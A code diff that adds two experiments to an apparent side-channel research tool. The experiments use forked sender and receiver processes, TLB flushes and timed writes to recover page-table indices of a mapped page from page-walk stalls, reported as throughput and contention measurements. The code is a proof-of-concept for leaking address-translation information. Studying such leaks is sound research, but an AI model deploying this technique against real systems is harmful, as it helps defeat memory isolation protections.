@@ -31,6 +31,11 @@ static void unmap(u8 *page, size_t size) {
     }
 }
 
+static u16 get_PL_index(void *ptr, u8 level) {
+    u64 page = ((uintptr_t)ptr >> 12);
+    return (page >> ((level - 1) * 9)) & 0x1ff;
+}
+
 // we only need one bit of information to indicate if PT walk stalls,
 // therefore, we only need a probe array with one element,
 // and access it if PT walk doesn't stall.
@@ -115,6 +120,141 @@ mmap_fail:
     return ret;
 }
 
+static int __attribute__((noinline)) load_page_recovery_throughput() {
+    int ret;
+    u16 offset = 0x888;
+    const u32 MEASURES = 100, REPEATS = 100000;
+    const u32 page_size = getpagesize();
+
+    // a page with PL4_index = 0x87, PL3_index = 0x65,
+    // PL2_index = 0x43, PL1_index = 0x21
+    u8 *page = mmap((void *)0x439948621000ull, page_size,
+                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED) {
+        return 1;
+    }
+
+    fprintf(stderr, "Oracles:\n");
+    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
+    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
+    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
+    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));
+
+    // controls when to measure throughput in sender
+    volatile u8 *start = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    // shared page to store throughput results
+    u64 *counts = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (start == MAP_FAILED || counts == MAP_FAILED) {
+        return 1;
+    }
+    *start = 0;
+    memset(counts, 0, page_size);
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        // sender
+        u32 idx = 0;
+        while (true) {
+            u64 cnt = 0;
+            while (!*start); /* busy wait */
+
+            // start measurement
+            while (*start) {
+                ptedit_invalidate_tlb(page);
+                _maccess(page);
+                _lfence();
+                cnt += 1;
+            }
+            // save throughput results
+            counts[idx % 512] = cnt;
+            idx++;
+        }
+    } else if (pid < 0) {
+        fprintf(stderr, "Failed to fork.\n");
+        return 2;
+    }
+
+    // receiver
+    for (u32 disp = 0; disp < (1 << 9); disp++) {
+        u8 *ptr = victim_page + (disp << 3);
+        usleep(1000);
+        *start = 1; // start measurement in sender
+        _lfence();
+        for (u32 rept = 0; rept < REPEATS; rept++) {
+            _mwrite(ptr, 0xff); // attempt to stall page walks in sender
+        }
+        *start = 0; // end measurement
+    }
+
+    for (u32 disp = 0; disp < (1 << 9); disp++) {
+        printf("%#5x\t%lu\n", disp, counts[disp]);
+    }
+
+    kill(pid, SIGKILL);
+    munmap(counts, page_size);
+    munmap((u8 *)start, page_size);
+    munmap(page, page_size);
+    return ret;
+}
+
+static int __attribute__((noinline)) load_page_recovery_contention() {
+    int ret;
+    u16 offset = 0x888;
+    const u32 MEASURES = 50, REPEATS = 1000000;
+    const u32 page_size = getpagesize();
+
+    // a page with PL4_index = 0x87, PL3_index = 0x65,
+    // PL2_index = 0x43, PL1_index = 0x21
+    u8 *page = mmap((void *)0x439948621000ull, page_size,
+                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED) {
+        return 1;
+    }
+
+    fprintf(stderr, "Oracles:\n");
+    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
+    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
+    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
+    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        u32 idx = 0;
+        while (true) {
+            ptedit_invalidate_tlb(page);
+            _maccess(page);
+        }
+    } else if (pid < 0) {
+        fprintf(stderr, "Failed to fork.\n");
+        return 2;
+    }
+
+    for (u32 disp = 0; disp < (1 << 9); disp++) {
+        u8 *ptr = victim_page + (disp << 3);
+        u64 total_time = 0;
+        // measure execution latency for MEASURES times
+        for (u32 cnt = 0; cnt < MEASURES; cnt++) {
+            struct timespec t_start, t_end;
+            _lfence();
+            clock_gettime(CLOCK_MONOTONIC, &t_start);
+            for (u32 rept = 0; rept < REPEATS; rept++) {
+                _mwrite(ptr, 0xff);
+            }
+            clock_gettime(CLOCK_MONOTONIC, &t_end);
+            u64 nsec_diff = (t_end.tv_sec - t_start.tv_sec) * 1e9 +
+                            (t_end.tv_nsec - t_start.tv_nsec);
+            total_time += nsec_diff;
+        }
+        printf("%#5x\t%lu\n", disp, total_time / MEASURES);
+    }
+
+    kill(pid, SIGKILL);
+    munmap(page, page_size);
+    return ret;
+}
+
 // used for setjmp based fault suppression
 static void segv_handler(int signum) {
     sigset_t sigs;
@@ -155,6 +295,12 @@ int main(int argc, char **argv) {
     switch (argv[1][0]) {
         case '0':
             ret = store_offset_recovery();
+            break;
+        case '1':
+            ret = load_page_recovery_throughput();
+            break;
+        case '2':
+            ret = load_page_recovery_contention();
             break;
         default:
             ret = -3;
